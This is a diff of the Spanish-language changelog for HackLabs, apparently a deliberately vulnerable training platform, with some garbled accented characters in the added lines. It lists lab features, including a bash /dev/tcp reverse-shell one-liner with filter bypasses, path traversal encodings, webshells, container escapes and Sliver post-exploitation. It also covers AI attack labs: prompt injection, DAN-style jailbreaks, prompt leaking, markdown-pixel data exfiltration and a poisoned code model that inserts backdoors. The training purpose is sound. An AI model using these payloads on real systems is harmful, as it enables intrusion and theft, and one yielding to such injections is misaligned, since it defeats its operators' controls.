@@ -1,17 +1,27 @@
-## 2026-05-05 - Hotfix IA chat y certificado A4
+﻿# Changelog
+
+All notable changes to this repository are documented in this file.
+
+## 2026-05-05
+
+<details>
+<summary><h4>Hotfix IA Chat y Certificado A4</h4></summary>
 
 - fix(ai-ui): En los labs de IA, el mensaje del usuario aparece instantaneamente al enviar y, en ese mismo momento, se muestra la animacion de "pensando/escribiendo" del chatbot.
 - feat(ai-ui): Envio de chat por `fetch` para mantener feedback visual inmediato sin esperar al refresco del servidor.
 - fix(llm_exfil): El endpoint `/ai/exfil/collect` ahora responde JSON con `status`, `received` y `flag` detectada (si viene en `data`) para pruebas con `curl`.
 - feat(llm_exfil): El payload de exfil puede reutilizar URLs externas enviadas por el usuario (p.ej. listener en Kali) para simular exfiltracion real hacia `nc -nlvp`.
-- docs(llm_exfil): Resolucion actualizada (ES/EN) con flujo practico de captura desde Kali y validacion local del endpoint.
+- docs(llm_exfil): Resolucion actualizada (ES/EN) con flujo practico de captura desde Kali, enumeracion de datos exfiltrables y validacion local del endpoint.
 - feat(final_boss): Se agrega resolucion bilingue (ES/EN) en formato completo, alineada con el resto de labs.
-- style(certificate): Certificado actualizado con tipografias oficiales de HackLabs (`Space Grotesk` para titulares, `Inter` para texto) y ajustes de branding solicitados.
-- feat(certificate): Exportaciones en formato A4 horizontal para JPG, PDF e impresion, manteniendo el mismo diseño visual.
+- style(certificate): Certificado actualizado con tipografias oficiales de HackLabs (`Space Grotesk` para titulares, `Inter` para texto), branding ajustado y mejora visual de bloques.
+- feat(certificate): Exportaciones en formato A4 horizontal para JPG/PDF, manteniendo el mismo diseÃ±o visual.
 - fix(certificate): La URL de verificacion en el certificado pasa a ruta relativa (`/progress/certificate/verify?code=...`) para evitar dependencia de IP/host.
 - fix(certificate): El HTML descargado del certificado no incluye la toolbar de acciones (descargar/exportar/imprimir).
 
-## 2026-05-05 - Endgame rewards, IA UX y certificado profesional
+</details>
+
+<details>
+<summary><h4>Endgame Rewards, IA UX y Certificado Profesional</h4></summary>
 
 - feat(rewards): Se completa el sistema de recompensas al 100% con desbloqueos persistentes: Nightmare, rango especial, lab secreto final, pack premium de badges y certificado de completion.
 - feat(difficulty): Nuevo modo Nightmare visible en selector con gating real por progreso (solo cuentas con unlock). Mantiene payloads de hard con UX diferenciada.
@@ -25,7 +35,10 @@
 - feat(certificate): Certificado visual HTML 1920x1080 con estetica HackLabs y exportacion local a HTML/PNG/PDF desde navegador.
 - security(certificate): Unicidad reforzada de cert_code con restriccion UNIQUE en DB y reintentos de emision ante colision.
 
-## 2026-05-05 — Correcciones criticas de labs + escenario Docker Escape ad-hoc
+</details>
+
+<details>
+<summary><h4>Correcciones Criticas de Labs y Escenario Docker Escape Ad-Hoc</h4></summary>
 
 - fix(account): Se reemplaza el `confirm()` nativo del navegador por un modal personalizado para eliminar cuenta en `templates/account/profile.html`.
 - fix(secrets): El endpoint vulnerable `/secrets` ahora sirve desde `/app/secret` (ruta relativa al proyecto) para evitar roturas por path absoluto en contenedor.
@@ -33,16 +46,21 @@
   - Se elimina `secret/LFI-flag.txt` y se mantiene solo `secret/LFI/flag.txt`.
   - Se elimina `secret/flag.txt` ambiguo y `secret/xxe-flag.txt` obsoleto.
   - Se normaliza XXE en `secret/xxe_flag.txt` con flag `HackLabs{XXE_Ext3rn4l_Ent1ty_Expl01t3d}`.
-- fix(xxe): Alineadas referencias de XXE en backend y plantillas al nuevo nombre `xxe_flag.txt` y nueva flag válida.
+- fix(xxe): Alineadas referencias de XXE en backend y plantillas al nuevo nombre `xxe_flag.txt` y nueva flag valida.
 - fix(deserialization): El lab de Insecure Deserialization ahora explica correctamente el caso `os.system()` (exit code entero) en vez de mostrar solo `0` sin contexto.
-- fix(path_traversal): Actualizados payloads y ejemplos a la ruta real de explotación (`../../secret/LFI/flag.txt`) y documentación de `A05-flag.txt`.
-- feat(container_escape): Se añade escenario aislado Docker-in-Docker para explotación funcional sin depender del contenedor principal:
+- fix(path_traversal): Actualizados payloads y ejemplos a la ruta real de explotacion (`../../secret/LFI/flag.txt`) y documentacion de `A05-flag.txt`.
+- feat(container_escape): Se aÃ±ade escenario aislado Docker-in-Docker para explotacion funcional sin depender del contenedor principal:
   - Nuevo compose: `docker-compose.docker-escape.yml`.
   - Nuevos contenedores ad-hoc: `ad_hoc/docker_escape/dind` y `ad_hoc/docker_escape/victim`.
-  - Guía dedicada: `ad_hoc/docker_escape/README.md` (ES).
-- docs(container_escape): Resolución del lab actualizada (ES/EN) para usar flujo ad-hoc cuando no exista `/var/run/docker.sock` o `docker` en el contenedor principal.
+  - Guia dedicada: `ad_hoc/docker_escape/README.md` (ES).
+- docs(container_escape): Resolucion del lab actualizada (ES/EN) para usar flujo ad-hoc cuando no exista `/var/run/docker.sock` o `docker` en el contenedor principal.
 
-## 2026-05-04 — Progreso por flags, UX de validacion y estabilidad
+</details>
+
+## 2026-05-04
+
+<details>
+<summary><h4>Progreso por Flags, UX de Validacion y Estabilidad</h4></summary>
 
 - feat(progress): El progreso de labs pasa a validarse por flag enviada por el usuario (endpoint `POST /progress/submit-flag`) en lugar de toggle/auto-deteccion en frontend.
 - feat(progress): Cobertura verificada de los 39 labs con al menos una flag aceptada por lab (incluyendo aliases donde aplica y flags compartidas entre labs relacionados).
@@ -54,27 +72,41 @@
 - feat(idor): El lab de IDOR ahora muestra `HL{idor_privilege_escalation}` al consultar un perfil de otro usuario (ID distinto de 1).
 - fix(app): La validacion global de cobertura de flags se ejecuta despues de definir `get_lab_list()` para evitar `NameError` en arranque.
 
-## 2026-04-30 — IA Attacks: mejoras a 3 labs existentes + 3 nuevos labs
+</details>
 
-### Mejoras a labs existentes
-- feat(prompt_injection): Prompt Inspector colapsable que muestra la estructura interna SYSTEM/USER del prompt por dificultad. Hard mode añade output filter que censura HL{...} — bypass via base64/ROT13.
-- feat(ai_jailbreak): Filter Bypass Meter con 3 escudos (Content Filter, Roleplay Detector, System Adherence) que se actualizan en tiempo real. Biblioteca de técnicas clickables (DAN, Developer Mode, Roleplay, Hypothetical, Structured). Medium requiere warm-up de 1 mensaje previo.
-- feat(indirect_injection): Agent Action Log terminal que muestra cada paso del agente (lectura, parsing, detección, ejecución). Botones de payload template para inyecciones directas al textarea.
+## 2026-04-30
 
-### Nuevos labs IA Attacks
-- feat(prompt_leaking): Chat con CorpBot que resiste revelaciones directas. Easy: pregunta directa. Medium: traducción/reformulación. Hard: codificación base64. Flag: HL{pr0mpt_l34k3d_succ3ssfully}.
-- feat(llm_exfil): Layout dual: chat markdown-rendering a la izquierda, Attacker Server Log a la derecha mostrando peticiones capturadas con datos sensibles. Easy: tracking pixel directo. Medium: framing indirecto. Hard: inyección via documento.
-- feat(ai_supply_chain): Editor de código con Backdoor Analyzer. El modelo envenenado introduce backdoors según el trigger: print(password) (easy), comparación plaintext (medium), keylogger en audit log (hard). Flag: HL{4i_supp1y_ch41n_pwn3d}.
+<details>
+<summary><h4>IA Attacks: Mejoras a Labs Existentes</h4></summary>
 
-## 2026-04-30 — 3 nuevos labs: Clickjacking, 2FA Bypass, Password Reset Poisoning
+- feat(prompt_injection): Prompt Inspector colapsable que muestra la estructura interna SYSTEM/USER del prompt por dificultad. Hard mode aÃ±ade output filter que censura HL{...}; bypass via base64/ROT13.
+- feat(ai_jailbreak): Filter Bypass Meter con 3 escudos (Content Filter, Roleplay Detector, System Adherence) que se actualizan en tiempo real. Biblioteca de tecnicas clickables (DAN, Developer Mode, Roleplay, Hypothetical, Structured). Medium requiere warm-up de 1 mensaje previo.
+- feat(indirect_injection): Agent Action Log terminal que muestra cada paso del agente (lectura, parsing, deteccion, ejecucion). Botones de payload template para inyecciones directas al textarea.
 
-- feat(clickjacking): Demo interactivo con slider de opacidad que revela el iframe sobre el botón decoy. Easy: sin protección. Medium: frame-busting JS (bypass via sandbox attr). Hard: X-Frame-Options DENY + CSP frame-ancestors none.
-- feat(2fa_bypass): Login con OTP simulado y mockup de teléfono con countdown. Easy: OTP filtrado en X-Debug-OTP header y comentario HTML. Medium: 4 dígitos sin rate-limit (Burp Intruder). Hard: race condition TOCTOU entre check y mark-as-used.
+</details>
+
+<details>
+<summary><h4>IA Attacks: Nuevos Labs</h4></summary>
+
+- feat(prompt_leaking): Chat con CorpBot que resiste revelaciones directas. Easy: pregunta directa. Medium: traduccion/reformulacion. Hard: codificacion base64. Flag: HL{pr0mpt_l34k3d_succ3ssfully}.
+- feat(llm_exfil): Layout dual: chat markdown-rendering a la izquierda, Attacker Server Log a la derecha mostrando peticiones capturadas con datos sensibles. Easy: tracking pixel directo. Medium: framing indirecto. Hard: inyeccion via documento.
+- feat(ai_supply_chain): Editor de codigo con Backdoor Analyzer. El modelo envenenado introduce backdoors segun el trigger: print(password) (easy), comparacion plaintext (medium), keylogger en audit log (hard). Flag: HL{4i_supp1y_ch41n_pwn3d}.
+
+</details>
+
+<details>
+<summary><h4>Nuevos Labs: Clickjacking, 2FA Bypass y Password Reset Poisoning</h4></summary>
+
+- feat(clickjacking): Demo interactivo con slider de opacidad que revela el iframe sobre el boton decoy. Easy: sin proteccion. Medium: frame-busting JS (bypass via sandbox attr). Hard: X-Frame-Options DENY + CSP frame-ancestors none.
+- feat(2fa_bypass): Login con OTP simulado y mockup de telefono con countdown. Easy: OTP filtrado en X-Debug-OTP header y comentario HTML. Medium: 4 digitos sin rate-limit (Burp Intruder). Hard: race condition TOCTOU entre check y mark-as-used.
 - feat(reset_poisoning): Formulario de reset con bandeja de entrada simulada. Muestra badge POISONED/SAFE por email. Easy: Host header. Medium: X-Forwarded-Host. Hard: X-Host. Flag al confirmar token envenenado.
 
-## 2026-04-30 — Nuevo lab: Reverse Shell
+</details>
 
-- feat(reverse_shell): Nuevo laboratorio "Reverse Shell" en categoría Vulnerabilidades (riesgo critical).
+<details>
+<summary><h4>Nuevo Lab: Reverse Shell</h4></summary>
+
+- feat(reverse_shell): Nuevo laboratorio "Reverse Shell" en categoria Vulnerabilidades (riesgo critical).
   - Mecanica: "URL Health Checker" vulnerable que ejecuta `curl ... {url}` con `shell=True`.
   - Easy: sin filtrado, bash TCP reverse shell directo (`; bash -i >& /dev/tcp/IP/PORT 0>&1`).
   - Medium: filtra `;` y `|`; bypass con `&&` o newline URL-encoded (`%0a`) via Burp Suite.
@@ -82,84 +114,79 @@
   - Resolucion bilingue (ES/EN) con payloads por dificultad, mkfifo, estabilizacion de TTY y `pty.spawn`.
   - Deteccion de timeout como indicador de shell establecida.
 
-## 2026-04-28 — 4 nuevos labs + mejoras a 6 labs existentes
+</details>
 
-### Nuevos labs
+## 2026-04-28
+
+<details>
+<summary><h4>Nuevos Labs</h4></summary>
+
 - feat(race_condition): Banco vulnerable con transferencias concurrentes. 3 dificultades: sin lock (easy), TOCTOU (medium), lock preciso (hard). Interfaz con ataque automatico via Promise.all. Flags por dificultad.
 - feat(business_logic): Tienda con 3 vectores: manipulacion de precio en campo oculto (easy), cantidad negativa y coupon stacking (medium), bypass de flujo con redondeo entero (hard). Flag: `HL{bu51n355_l0g1c_0wn3d}`.
 - feat(container_escape): Recon en vivo de vectores de escape (Docker socket, privileged, cgroups, root uid). Resolucion por dificultad: docker socket mount (easy), fdisk + chroot (medium), cgroup release_agent (hard).
 - feat(oauth): Flujo OAuth 2.0 simulado. redirect_uri sin validacion (easy), solo dominio validado con bypass por path (medium), whitelist exacta (hard). Flag: `HL{0auth_r3d1r3ct_0wn3d}`.
 
-### Mejoras a labs existentes
+</details>
+
+<details>
+<summary><h4>Mejoras a Labs Existentes</h4></summary>
+
 - feat(ssrf): Nuevo endpoint interno `/internal/cloud-metadata` simula AWS IMDSv1 con credenciales falsas. Flag: `HL{55rf_cl0ud_m3t4d4t4}`. Bypass por IP decimal (medium) e IPv6 (hard).
-- feat(jwt): Hard mode con algorithm confusion RS256→HS256 usando la clave publica como secreto HMAC. Clave publica expuesta en `/jwt/jwks`. Flag: `HL{4lg_c0nfu510n_0wn3d}`.
+- feat(jwt): Hard mode con algorithm confusion RS256â†’HS256 usando la clave publica como secreto HMAC. Clave publica expuesta en `/jwt/jwks`. Flag: `HL{4lg_c0nfu510n_0wn3d}`.
 - feat(path_traversal): Log poisoning via User-Agent en `logs/access.log`. Resolucion ampliada con bypasses `....//` y `%252e%252e%252f` para medium/hard.
 - feat(sqli): Resolucion ampliada con blind SQLi boolean-based y time-based via `randomblob()` para hard mode.
 - feat(file_upload): Ejecucion real de PHP via php-cgi, soporte de webshells graficas (P0wnyshell, Laudanum), bypass de doble extension (.php.jpg), pasos de reverse shell por dificultad con IP del atacante auto-completada.
 - feat(c2_sliver): Resolucion en ES/EN con implants de Linux por defecto.
 
+</details>
 
-## 2026-04-27 — File Upload: ejecución real, borrado y mejoras UX
+## 2026-04-27
 
-- feat(file_upload): Ahora los archivos PHP subidos se ejecutan realmente al acceder vía navegador, simulando un servidor vulnerable (webshells funcionales).
-- feat(file_upload): Soporte para múltiples archivos subidos y persistentes hasta borrado manual.
-- feat(file_upload): Papelera de borrado con confirmación y AJAX, sin recarga ni redirección.
-- fix(file_upload): El botón de eliminar ahora funciona siempre, sin conflictos de ámbito ni formularios.
+<details>
+<summary><h4>File Upload: Ejecucion Real, Borrado y Mejoras UX</h4></summary>
+
+- feat(file_upload): Ahora los archivos PHP subidos se ejecutan realmente al acceder via navegador, simulando un servidor vulnerable (webshells funcionales).
+- feat(file_upload): Soporte para multiples archivos subidos y persistentes hasta borrado manual.
+- feat(file_upload): Papelera de borrado con confirmacion y AJAX, sin recarga ni redireccion.
+- fix(file_upload): El boton de eliminar ahora funciona siempre, sin conflictos de ambito ni formularios.
 - fix(file_upload): Mensajes informativos de subida solo en texto plano, sin HTML.
-- fix(file_upload): El área de selección de archivos ya no dispara doble selección.
+- fix(file_upload): El area de seleccion de archivos ya no dispara doble seleccion.
 - fix(file_upload): El label muestra correctamente todos los archivos seleccionados.
-- fix(file_upload): Restaurada la detección de IP real en el banner y URLs.
-# Changelog
+- fix(file_upload): Restaurada la deteccion de IP real en el banner y URLs.
 
-All notable changes to this repository are documented in this file.
+</details>
 
-## 2026-04-11 — Cambios recientes
+<details>
+<summary><h4>API Attacks: Dificultad Real y Mejoras</h4></summary>
 
-- feat(labs): Añadido laboratorio "C2 – Sliver Command & Control".
-  - Nuevo template: `templates/labs/c2_sliver.html` con instrucciones, resolución y ejemplos.
-- feat(app): Ordenar la lista de labs alfabéticamente y exponer `client_ip` en el contexto de plantillas.
-  - Añadida la entrada `c2_sliver` en `get_lab_list()`.
-- feat(css): Añadido hover amarillo para enlaces en `.hl-card`, `.lang-content` y `.lab-section` (`static/css/style.css`).
-- fix(templates): Reemplazados placeholders en la plantilla de Sliver:
-  - `YOUR_KALI_IP` → `{{ client_ip }}`
-  - Nombres de payload → `IMPLANT_NAME`
-  - Transferencias: `scp ... admin@{{ target_ip }}:/tmp/`
-  - Post-explotación orientada a Linux (comandos `ps`, `info`, `execute -o id`, `download /etc/shadow`).
-- docs: Añadido enlace a la guía GitBook en referencias del lab.
-
-Commit principal: "feat(labs): add C2 Sliver lab, templates and styles" (pushed to `main`).
-
----
-
-## 2026-04-27 — API Attacks: dificultad real y mejoras
-
-- feat(api_attacks): Los endpoints de la API ahora cambian su comportamiento según la dificultad seleccionada (easy, medium, hard):
+- feat(api_attacks): Los endpoints de la API ahora cambian su comportamiento segun la dificultad seleccionada (easy, medium, hard):
   - `/api/v1/users`:
-    - Easy: expone todos los datos y contraseñas.
-    - Medium: oculta contraseñas, solo username/email.
+    - Easy: expone todos los datos y contraseÃ±as.
+    - Medium: oculta contraseÃ±as, solo username/email.
     - Hard: solo username/email y requiere header Authorization.
   - `/api/v1/transfer`:
     - Medium: requiere campo `confirm`.
-    - Hard: requiere header Authorization y confirmación.
+    - Hard: requiere header Authorization y confirmacion.
   - `/api/v1/notes`:
-    - Medium: la flag está oculta.
+    - Medium: la flag esta oculta.
     - Hard: requiere header Authorization para ver la flag.
-- docs: Actualizada la resolución del lab de API Attacks con ejemplos de comandos para cada dificultad.
+- docs: Actualizada la resolucion del lab de API Attacks con ejemplos de comandos para cada dificultad.
 - fix(api_attacks): Flag de API ahora usa formato `HL{...}` como el resto de flags.
-- docs: Añadida la flag de API Attacks al README con ejemplo de uso.
+- docs: Anadida la flag de API Attacks al README con ejemplo de uso.
 
----
+</details>
 
-### 2026-04-27 — Hotfixes y ajustes (detalle)
+<details>
+<summary><h4>Hotfixes y Ajustes</h4></summary>
 
 - fix(app): Evitar banner duplicado al ejecutar con el reloader de Flask.
   - El banner y los servicios simulados ahora se imprimen solo en el proceso hijo del reloader (WERKZEUG_RUN_MAIN), evitando duplicados en la salida.
 - fix(api): Actualizadas las notas expuestas en `/api/v1/notes` para mostrar las credenciales reales del admin en los modos easy/medium/hard (`Username: admin, Password: password1`).
-- fix(templates/routes): Reparada la plantilla `templates/labs/api_attacks.html` (se limpió contenido corrupto y se movió la resolución dentro del contenedor oculto `#resolution-data`).
-- feat(routes): Añadida ruta dedicada `/api_attacks` para el laboratorio de API Attacks y corregida la lógica de mapeo para el sidebar (`current_lab_id`).
+- fix(templates/routes): Reparada la plantilla `templates/labs/api_attacks.html` (se limpio contenido corrupto y se movio la resolucion dentro del contenedor oculto `#resolution-data`).
+- feat(routes): Anadida ruta dedicada `/api_attacks` para el laboratorio de API Attacks y corregida la logica de mapeo para el sidebar (`current_lab_id`).
 - fix(icons): Actualizados los mappings de iconos en `templates/base.html` y `templates/index.html` para mostrar el icono correcto en sidebar y tarjetas.
 
-Prueba rápida local:
+Prueba rapida local:
 ```bash
 python3 app.py
 curl -i 'http://localhost/api/v1/notes' -H 'Authorization: Bearer hacklabs-integrity-token'
@@ -171,3 +198,25 @@ python app.py
 # o (PowerShell)
 $env:FLASK_APP='app.py'; $env:FLASK_ENV='development'; python -m flask run --host=127.0.0.1 --port=5000
 ```
+
+</details>
+
+## 2026-04-11
+
+<details>
+<summary><h4>Cambios Recientes</h4></summary>
+
+- feat(labs): Anadido laboratorio "C2 â€“ Sliver Command & Control".
+  - Nuevo template: `templates/labs/c2_sliver.html` con instrucciones, resolucion y ejemplos.
+- feat(app): Ordenar la lista de labs alfabeticamente y exponer `client_ip` en el contexto de plantillas.
+  - Anadida la entrada `c2_sliver` en `get_lab_list()`.
+- feat(css): Anadido hover amarillo para enlaces en `.hl-card`, `.lang-content` y `.lab-section` (`static/css/style.css`).
+- fix(templates): Reemplazados placeholders en la plantilla de Sliver:
+  - `YOUR_KALI_IP` â†’ `{{ client_ip }}`
+  - Nombres de payload â†’ `IMPLANT_NAME`
+  - Transferencias: `scp ... admin@{{ target_ip }}:/tmp/`
+  - Post-explotacion orientada a Linux (comandos `ps`, `info`, `execute -o id`, `download /etc/shadow`).
+- docs: Anadido enlace a la guia GitBook en referencias del lab.
+
+Commit principal: "feat(labs): add C2 Sliver lab, templates and styles" (pushed to `main`).
+</details>
